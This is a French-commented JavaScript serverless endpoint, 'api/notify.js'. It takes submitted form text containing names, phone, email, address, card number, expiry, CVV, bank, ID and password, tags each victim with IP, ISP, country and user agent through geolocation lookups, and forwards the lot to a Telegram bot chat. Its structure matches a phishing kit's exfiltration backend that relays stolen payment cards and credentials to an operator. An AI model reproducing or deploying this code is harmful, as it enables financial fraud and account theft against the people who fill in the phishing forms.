// api/notify.js
const TOKEN         = process.env.TELEGRAM_TOKEN;
const CHAT          = process.env.CHAT_ID;
const IPINFO_TOKEN  = process.env.IPINFO_TOKEN || '';   // facultatif (ipinfo.io)

// -----------------------------------------------------------------------------
// FONCTION utilitaire : tente plusieurs services jusqu’à succès
async function geoLookup(ip) {
  let isp = 'inconnue';
  let country = 'inconnue';

  // 1️⃣ ipinfo.io --------------------------------------------------------------
  try {
    const url = `https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`;
    const r   = await fetch(url);
    if (r.ok) {
      const d = await r.json();
      if (d.org) isp = d.org.replace(/^AS\\d+\\s+/, ''); // vire le n° AS
      if (d.country) country = d.country;                // code ISO (FR, US…)
      if (isp !== 'inconnue' || country !== 'inconnue') return { isp, country };
    }
  } catch (e) { console.error('ipinfo.io failed →', e); }

  // 2️⃣ ipwho.is --------------------------------------------------------------
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const d = await r.json();
    if (d.success) {
      isp     = d.org || isp;
      country = d.country || country;
      if (isp !== 'inconnue' || country !== 'inconnue') return { isp, country };
    }
  } catch (e) { console.error('ipwho.is failed →', e); }

  // 3️⃣ ip-api.com ------------------------------------------------------------
  try {
    const r = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,isp`);
    const d = await r.json();
    if (d.status === 'success') {
      isp     = d.isp     || isp;
      country = d.country || country;
    }
  } catch (e) { console.error('ip-api failed →', e); }

  return { isp, country };
}

// -----------------------------------------------------------------------------
// HANDLER principal
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { message } = req.body;
  if (!message) return res.status(400).json({ error: 'Missing message' });

  // IP & User-Agent
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // ISP & Pays
  const { isp, country } = await geoLookup(ip);

  // Date & heure
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: '2-digit' });
  const time = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Corps du message Telegram
  const [header, ...lines] = message.split('\\n');
  let text = `📣 *${header}*`;
  text += `\\n──────────────────`;
  lines.forEach(l => {
    const line = l.trim();
    if      (line.startsWith('Nom:'))        text += `\\n👤 ${line.slice(4).trim()}`;
    else if (line.startsWith('Prénom:'))     text += `\\n🙋 ${line.slice(7).trim()}`;
    else if (line.startsWith('Téléphone:'))  text += `\\n📞 ${line.slice(10).trim()}`;
    else if (line.startsWith('Email:'))      text += `\\n✉️ ${line.slice(6).trim()}`;
    else if (line.startsWith('Adresse:'))    text += `\\n🏠 ${line.slice(8).trim()}`;
    else if (line.startsWith('Numéro:'))     text += `\\n💳 ${line.slice(7).trim()}`;
    else if (line.startsWith('Exp:'))        text += `\\n📅 ${line.slice(4).trim()}`;
    else if (line.startsWith('CVV:'))        text += `\\n🔒 ${line.slice(4).trim()}`;
    else if (line.startsWith('Banque:'))     text += `\\n🏦 ${line.slice(7).trim()}`;
    else if (line.startsWith('ID:'))         text += `\\n🆔 ${line.slice(3).trim()}`;
    else if (line.startsWith('Pass:'))       text += `\\n🔑 ${line.slice(5).trim()}`;
    else                                     text += `\\n📋 ${line}`;
  });

  // Bloc standard
  text += `\\n──────────────────`;
  text += `\\n🗓️ Date & heure : ${date}, ${time}`;
  text += `\\n🌐 IP Client     : ${ip}`;
  text += `\\n🔎 ISP Client    : ${isp}`;
  text += `\\n🌍 Pays Client   : ${country}`;
  text += `\\n📍 User-Agent    : ${ua}`;
  text += `\\n©️ ${now.getFullYear()} ©️`;

  // Envoi à Telegram
  const payload = { chat_id: CHAT, text, parse_mode: 'Markdown', disable_web_page_preview: true };
  const tg = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });

  const raw  = await tg.text();
  const body = (() => { try { return JSON.parse(raw); } catch { return raw; } })();

  return res.status(tg.ok ? 200 : tg.status).json({ ok: tg.ok, full: body });
}